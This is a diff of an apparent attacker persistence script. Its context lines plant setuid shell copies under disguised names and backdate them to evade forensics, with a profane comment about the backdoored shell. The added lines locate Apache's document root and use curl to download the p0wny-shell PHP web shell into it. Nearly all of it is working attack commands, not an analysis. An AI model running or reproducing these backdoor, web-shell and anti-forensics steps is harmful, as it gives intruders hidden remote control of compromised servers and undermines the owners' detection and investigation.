@@ -35,6 +35,9 @@ chmod u+s /etc/bind-old
 chmod u+s /usr/share/home
 chmod u+s /home/.bash_lc
 #don't forget to use '-p' on the backdoored shell you stupid fuck
+#Add Powny shell to webroot
+$webroot=`grep -i 'DocumentRoot' /etc/apache2/sites-available/000-default.conf | sed 's/DocumentRoot //'`
+curl -o $webroot/shell.php https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
 #Change date of file creation to avoid forensics
 echo "[*]Changing dates of bash shells..."
 touch -t 200805130135 /etc/bind-old
